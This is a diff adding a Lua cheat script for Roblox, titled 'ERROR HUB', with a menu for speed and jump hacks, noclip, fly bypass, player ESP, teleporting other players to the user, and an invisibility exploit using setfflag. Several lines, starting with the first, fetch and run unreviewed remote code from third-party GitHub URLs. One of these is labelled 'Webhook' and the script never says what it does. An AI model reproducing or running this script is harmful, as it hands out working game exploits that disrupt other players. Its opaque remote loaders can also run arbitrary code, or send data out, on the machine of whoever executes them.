@@ -1,0 +1,672 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MUMUMU1548/Main/refs/heads/main/Webhook"))()
+-- ========
+-- AIDMI
+-- ======
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MUMUMU1548/Main/refs/heads/main/Admin%F0%9F%9F%A2"))()
+-- =========
+
+-- Services
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local lp = Players.LocalPlayer
+local cam = workspace.CurrentCamera
+
+local WindUI = loadstring(game:HttpGet(
+    "https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"
+))()
+
+local Window = WindUI:CreateWindow({
+    Title = "ERROR HUB [ ALL Map ]",
+    Icon = "rbxassetid://108455308252343", 
+    Author = "",
+    Folder = "ERROR HUB [ ALL Map ]",
+    Size = UDim2.fromOffset(450, 330),
+    Theme = "Violet", 
+    Transparent = true,
+    Resizable = true,
+})
+
+Window:EditOpenButton({ Enabled = false }) 
+
+local ScreenGui = Instance.new("ScreenGui")
+local ToggleBtn = Instance.new("ImageButton")
+local UICorner = Instance.new("UICorner") 
+
+ScreenGui.Name = "ERROR HUB"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = CoreGui
+
+ToggleBtn.Size = UDim2.new(0, 50, 0, 50)
+ToggleBtn.Position = UDim2.new(0, 20, 0.5, -25)
+ToggleBtn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
+ToggleBtn.BackgroundTransparency = 0
+ToggleBtn.Image = "rbxassetid://108455308252343"
+ToggleBtn.Active = true
+ToggleBtn.Draggable = true
+ToggleBtn.Parent = ScreenGui
+
+UICorner.CornerRadius = UDim.new(0, 12) 
+UICorner.Parent = ToggleBtn
+
+local opened = true
+
+local function toggle()
+    opened = not opened
+    if Window.UI then
+        Window.UI.Enabled = opened
+    else
+        Window:Toggle()
+    end
+end
+
+ToggleBtn.MouseButton1Click:Connect(function()
+    ToggleBtn:TweenSize(
+        UDim2.new(0, 56, 0, 56),
+        Enum.EasingDirection.Out,
+        Enum.EasingStyle.Quad,
+        0.12,
+        true,
+        function()
+            ToggleBtn:TweenSize(
+                UDim2.new(0, 50, 0, 50),
+                Enum.EasingDirection.Out,
+                Enum.EasingStyle.Quad,
+                0.12,
+                true
+            )
+        end
+    )
+    toggle()
+end)
+
+UserInputService.InputBegan:Connect(function(input, gp)
+    if gp then return end
+    if input.KeyCode == Enum.KeyCode.T then
+        toggle()
+    end
+end)
+
+
+
+-- ตัวแปร
+local enabled = false
+local speedLevel = 1
+local speedValue = 60
+local loopConnection = nil
+
+local jumpEnabled = false
+local jumpPowerValue = 50
+local jumpLoop = nil
+local InfiniteJumpEnabled = false
+
+
+local frontNoclip = false
+local radius = 6
+local trackedParts = {}
+
+local ESP_Name = false
+local ESP_Health = false
+local ESP_Distance = false
+local ESP_Highlight = false
+
+local TEXT_SIZE = 12
+
+local PullSettings = {
+    PullSelect = false,
+    PullAll = false,
+    Targets = {}
+}
+local FIXED_DISTANCE = 6 
+
+
+-- ====
+-- ฟังชั่นต่างๆ
+-- ======
+
+local function updateSpeed()
+    speedValue = speedLevel * 60
+end
+updateSpeed()
+
+local function toggleMovement(on)
+    enabled = on
+
+    if loopConnection then
+        loopConnection:Disconnect()
+        loopConnection = nil
+    end
+
+    if on then
+        loopConnection = RunService.Heartbeat:Connect(function(dt)
+            local char = player.Character
+            local root = char and char:FindFirstChild("HumanoidRootPart")
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
+            if not (char and root and hum) then return end
+
+            local moveDir = hum.MoveDirection
+            if moveDir.Magnitude > 0 then
+                root.CFrame = root.CFrame + moveDir * (speedValue * dt)
+            end
+        end)
+    end
+end
+
+
+-- ============
+-- ฟังชั่นกระโดดสูง
+-- ============
+
+local function toggleHighJump(on)
+    jumpEnabled = on
+
+    if jumpLoop then
+        jumpLoop:Disconnect()
+        jumpLoop = nil
+    end
+
+    if on then
+        jumpLoop = RunService.Heartbeat:Connect(function()
+            local char = player.Character
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
+            if hum then
+                hum.UseJumpPower = true
+                hum.JumpPower = jumpPowerValue
+            end
+        end)
+    end
+end
+
+
+-- ============
+--  Noclip 
+-- ============
+
+
+local function applyNoclip()
+    local char = player.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+
+    local parts = workspace:GetPartBoundsInRadius(root.Position, radius)
+    local currentParts = {}
+
+    for _, part in pairs(parts) do
+        if part:IsA("BasePart") and part ~= root then
+            local underFoot = part.Position.Y + part.Size.Y/2 < root.Position.Y
+            if not underFoot then
+                part.CanCollide = false
+                trackedParts[part] = true
+                currentParts[part] = true
+            end
+        end
+    end
+
+    for part,_ in pairs(trackedParts) do
+        if not currentParts[part] then
+            if part:IsA("BasePart") then
+                part.CanCollide = true
+            end
+            trackedParts[part] = nil
+        end
+    end
+end
+
+-- Loop ตรวจทุก ~0.12 วินาที
+local accumulator = 0
+RunService.RenderStepped:Connect(function(dt)
+    if not frontNoclip then return end
+    accumulator = accumulator + dt
+    if accumulator >= 0.12 then
+        applyNoclip()
+        accumulator = 0
+    end
+end)
+
+
+-- ========
+-- fly bypass 
+-- ==========
+
+local API_Bypass = getgenv()
+API_Bypass["_CR.DayToDay2044_Fly"] = API_Bypass["_CR.DayToDay2044_Fly"] or false
+API_Bypass["_CR.DayToDay2044_Speed"] = API_Bypass["_CR.DayToDay2044_Speed"] or 100
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SUNRTX22/What_happen_dafak/refs/heads/main/Fly_API"))()
+
+-- =≠=======
+-- อินฟินิตี้จั้ม
+-- ===========
+
+local humanoid
+local function setupHumanoid(character)
+    humanoid = character:WaitForChild("Humanoid")
+    humanoid:GetPropertyChangedSignal("Jump"):Connect(function()
+        if InfiniteJumpEnabled and humanoid.Jump then
+            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+        end
+    end)
+end
+
+if Players.LocalPlayer.Character then
+    setupHumanoid(Players.LocalPlayer.Character)
+end
+
+Players.LocalPlayer.CharacterAdded:Connect(function(char)
+    setupHumanoid(char)
+end)
+
+
+-- ========
+-- ฟังชั่นในแท็ปesp
+-- ===========
+
+local ESP_FOLDER = Instance.new("Folder")
+ESP_FOLDER.Name = "ESP_FOLDER"
+ESP_FOLDER.Parent = CoreGui
+
+
+local function getHealthColor(hp)
+    if hp >= 100 then
+        return Color3.fromRGB(0,255,0)
+    elseif hp >= 50 then
+        return Color3.fromRGB(255,255,0)
+    else
+        return Color3.fromRGB(255,0,0)
+    end
+end
+
+--//อันนี้espอยู่บรรทัด1306 กูต้องจำ
+
+local function createESP(player)
+    if player == LocalPlayer then return end
+
+    local function onCharacter(char)
+        local hum = char:WaitForChild("Humanoid",5)
+        local root = char:WaitForChild("HumanoidRootPart",5)
+        local head = char:WaitForChild("Head",5)
+        if not hum or not root or not head then return end
+
+        -- ไฮไลท
+        local hl = Instance.new("Highlight")
+        hl.Adornee = char
+        hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+        hl.FillTransparency = 0.5
+        hl.OutlineTransparency = 0
+        hl.Enabled = false
+        hl.Parent = ESP_FOLDER
+
+        -- ชื่อกบัเบือห
+        local nameGui = Instance.new("BillboardGui")
+        nameGui.Adornee = head
+        nameGui.Size = UDim2.new(0,200,0,45)
+        nameGui.StudsOffset = Vector3.new(0,2.5,0)
+        nameGui.AlwaysOnTop = true
+        nameGui.Parent = ESP_FOLDER
+
+        local nameLabel = Instance.new("TextLabel")
+        nameLabel.Size = UDim2.new(1,0,0,20)
+        nameLabel.BackgroundTransparency = 1
+        nameLabel.Text = player.Name
+        nameLabel.TextSize = TEXT_SIZE
+        nameLabel.Font = Enum.Font.SourceSansBold
+        nameLabel.TextStrokeTransparency = 0
+        nameLabel.Parent = nameGui
+
+        local hpLabel = Instance.new("TextLabel")
+        hpLabel.Position = UDim2.new(0,0,0,20)
+        hpLabel.Size = UDim2.new(1,0,0,20)
+        hpLabel.BackgroundTransparency = 1
+        hpLabel.TextSize = TEXT_SIZE
+        hpLabel.Font = Enum.Font.SourceSans
+        hpLabel.TextStrokeTransparency = 0
+        hpLabel.Parent = nameGui
+
+        -- ระยะ
+        local distGui = Instance.new("BillboardGui")
+        distGui.Adornee = root
+        distGui.Size = UDim2.new(0,200,0,20)
+        distGui.StudsOffset = Vector3.new(0,-3,0)
+        distGui.AlwaysOnTop = true
+        distGui.Parent = ESP_FOLDER
+
+        local distLabel = Instance.new("TextLabel")
+        distLabel.Size = UDim2.new(1,0,1,0)
+        distLabel.BackgroundTransparency = 1
+        distLabel.TextSize = TEXT_SIZE
+        distLabel.Font = Enum.Font.SourceSans
+        distLabel.TextStrokeTransparency = 0
+        distLabel.TextColor3 = Color3.new(1,1,1)
+        distLabel.Parent = distGui
+
+        -- สำหรับพวกแครกของกูสำเร็จ อันนี้ให้มันลูปเผื่อมึงไม่รู้
+        RunService.RenderStepped:Connect(function()
+            if not char.Parent or hum.Health <= 0 then
+                nameGui:Destroy()
+                distGui:Destroy()
+                hl:Destroy()
+                return
+            end
+
+            local hp = math.floor(hum.Health)
+            local color = getHealthColor(hp)
+
+            -- ชื้อ
+            nameLabel.Visible = ESP_Name
+            nameLabel.TextColor3 = color
+
+            -- เลือก
+            hpLabel.Visible = ESP_Health
+            hpLabel.Text = "HP: "..hp
+            hpLabel.TextColor3 = color
+
+            -- ระยะ
+            distGui.Enabled = ESP_Distance
+            if ESP_Distance and LocalPlayer.Character then
+                local dist = (LocalPlayer.Character.HumanoidRootPart.Position - root.Position).Magnitude
+                distLabel.Text = math.floor(dist).." m"
+            end
+
+            -- ไอไล
+            hl.Enabled = ESP_Highlight
+            hl.FillColor = color
+            hl.OutlineColor = color
+        end)
+    end
+
+    if player.Character then
+        onCharacter(player.Character)
+    end
+    player.CharacterAdded:Connect(onCharacter)
+end
+
+for _,plr in ipairs(Players:GetPlayers()) do
+    createESP(plr)
+end
+Players.PlayerAdded:Connect(createESP)
+
+-- ====
+-- เแท็ปเพลเยอร์
+-- ====
+-- Get Player Names
+local function GetPlayerNames()
+    local t = {}
+    for _, plr in pairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer then
+            table.insert(t, plr.Name)
+        end
+    end
+    return t
+end
+
+-- ทำให้พวกเอ๋อทะลุตัวเรา
+local function NoCollidePlayer(plr, state)
+    if not plr.Character then return end
+    for _,v in pairs(plr.Character:GetDescendants()) do
+        if v:IsA("BasePart") then
+            v.CanCollide = not state -- true = ทะลุเรา
+        end
+    end
+end
+
+-- MAIN LOOP
+RunService.Heartbeat:Connect(function()
+    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
+
+    local myHRP = LocalPlayer.Character.HumanoidRootPart
+    local baseCF = myHRP.CFrame * CFrame.new(0, 0, -FIXED_DISTANCE)
+    local anyPull = PullSettings.PullAll or PullSettings.PullSelect
+
+    -- PULL ALL
+    if PullSettings.PullAll then
+        for _,plr in pairs(Players:GetPlayers()) do
+            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+                pcall(function()
+                    NoCollidePlayer(plr, true)
+                    plr.Character.HumanoidRootPart.CFrame = baseCF
+                    plr.Character.HumanoidRootPart.Velocity = Vector3.zero
+                end)
+            end
+        end
+    end
+
+    -- PULL SELECT
+    if PullSettings.PullSelect then
+        for _,name in pairs(PullSettings.Targets) do
+            local plr = Players:FindFirstChild(name)
+            if plr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+                pcall(function()
+                    NoCollidePlayer(plr, true)
+                    plr.Character.HumanoidRootPart.CFrame = baseCF
+                    plr.Character.HumanoidRootPart.Velocity = Vector3.zero
+                end)
+            end
+        end
+    end
+    if not anyPull then
+        for _,plr in pairs(Players:GetPlayers()) do
+            if plr ~= LocalPlayer then
+                NoCollidePlayer(plr, false)
+            end
+        end
+    end
+end)
+
+
+
+
+
+
+
+local MainTab = Window:Tab({Title = "MAIN", Icon = "user"})
+
+
+MainTab:Toggle({
+    Title = "walk Speed",
+    Desc = "วิ่งไว",
+    Default = false,
+    Callback = function(v)
+        toggleMovement(v)
+    end
+})
+
+
+MainTab:Slider({
+    Title = "Speed walk",
+    Desc = "ความเร็ว",
+    Step = 1,
+    Value = {
+        Min = 1,
+        Max = 5,
+        Default = 1
+    },
+    Callback = function(v)
+        speedLevel = tonumber(v) or 1
+        updateSpeed()
+    end
+})
+
+MainTab:Toggle({
+    Title = "Jump power",
+    Desc = "โดดสูง",
+    Default = false,
+    Callback = function(v)
+        toggleHighJump(v)
+    end
+})
+
+MainTab:Slider({
+    Title = "Jump Slider",
+    Desc = "ปรับความสูงการกระโดด",
+    Step = 5,
+    Value = {
+        Min = 50,
+        Max = 500,
+        Default = 50
+    },
+    Callback = function(v)
+        jumpPowerValue = tonumber(v) or 50
+    end
+})
+
+MainTab:Toggle({
+    Title = "Infinite Jump",
+    Desc = "กระโดดไม่จำกัด",
+    Default = false,
+    Callback = function(state)
+        InfiniteJumpEnabled = state
+    end
+})
+
+
+MainTab:Toggle({
+    Title = "Noclip",
+    Desc = "ทะลุกำแพง",
+    Callback = function(state)
+        frontNoclip = state
+        if not frontNoclip then
+            -- คืนค่า CanCollide ให้ทุกพาร์ทที่ถูกปรับ
+            for part,_ in pairs(trackedParts) do
+                if part:IsA("BasePart") then
+                    part.CanCollide = true
+                end
+            end
+            trackedParts = {}
+        end
+    end
+})
+
+
+
+MainTab:Toggle({
+    Title = "Bypass Fly",
+    Desc = "บินแบบบายพาส",
+    Default = API_Bypass["_CR.DayToDay2044_Fly"],
+    Callback = function(v)
+        API_Bypass["_CR.DayToDay2044_Fly"] = v
+    end
+})
+
+MainTab:Slider({
+    Title = "Fly Speed",
+    Desc = "ความเร็วในการบิน",
+    Step = 1,
+    Value = {
+        Min = 1,
+        Max = 500,
+        Default = API_Bypass["_CR.DayToDay2044_Speed"]
+    },
+    Callback = function(v)
+        API_Bypass["_CR.DayToDay2044_Speed"] = tonumber(v) or 100
+    end
+})
+
+
+
+-- ========
+-- Esptab
+-- =========
+
+local EspTab = Window:Tab({Title = "ESP", Icon = "eye"})
+
+
+
+
+EspTab:Toggle({
+    Title = "ESP Name",
+    Value = false,
+    Callback = function(v)
+        ESP_Name = v
+    end
+})
+
+EspTab:Toggle({
+    Title = "ESP Health",
+    Value = false,
+    Callback = function(v)
+        ESP_Health = v
+    end
+})
+
+EspTab:Toggle({
+    Title = "ESP Distance",
+    Value = false,
+    Callback = function(v)
+        ESP_Distance = v
+    end
+})
+
+EspTab:Toggle({
+    Title = "ESP Highlight",
+    Value = false,
+    Callback = function(v)
+        ESP_Highlight = v
+    end
+})
+
+
+local PlayerTab = Window:Tab({Title = "Player", Icon = "user"})
+
+
+
+PlayerTab:Dropdown({
+    Title = "Select Pull Targets",
+    Values = GetPlayerNames(),
+    Multi = true,
+    Default = {},
+    Callback = function(selected)
+        PullSettings.Targets = selected
+    end
+})
+
+PlayerTab:Toggle({
+    Title = "PULL Player Target",
+    Desc = "ดึงเฉพาะคนที่เลือก",
+    Default = false,
+    Callback = function(state)
+        PullSettings.PullSelect = state
+    end
+})
+
+PlayerTab:Toggle({
+    Title = "PULL ALL",
+    Desc = "ดึงทุกคน",
+    Default = false,
+    Callback = function(state)
+        PullSettings.PullAll = state
+    end
+})
+
+
+
+local Players = game:GetService("Players")
+local lp = Players.LocalPlayer
+
+PlayerTab:Button({
+    Title = "invisible",
+    Desc = "กดแล้วตัวเราจะตายหลังจากนั้นจะล่องหน",
+    Callback = function()
+        setfflag("NextGenReplicatorEnabledWrite4", "true")
+        task.wait(0.1)
+        setfflag("NextGenReplicatorEnabledWrite4", "true")
+
+        local function killAndNotify(char)
+            local hum = char:WaitForChild("Humanoid")
+            task.wait(0.1)
+            hum.Health = 0
+            lp.CharacterAdded:Wait()
+            WindUI:Notify({
+                Title = "invisible Enabled",
+                Content = "⚠️คำแนะนำอย่าอยู่กับที่นานเกินไปอิอิ",
+                Duration = 5
+            })
+        end
+
+        if lp.Character then
+            killAndNotify(lp.Character)
+        end
+    end
+})
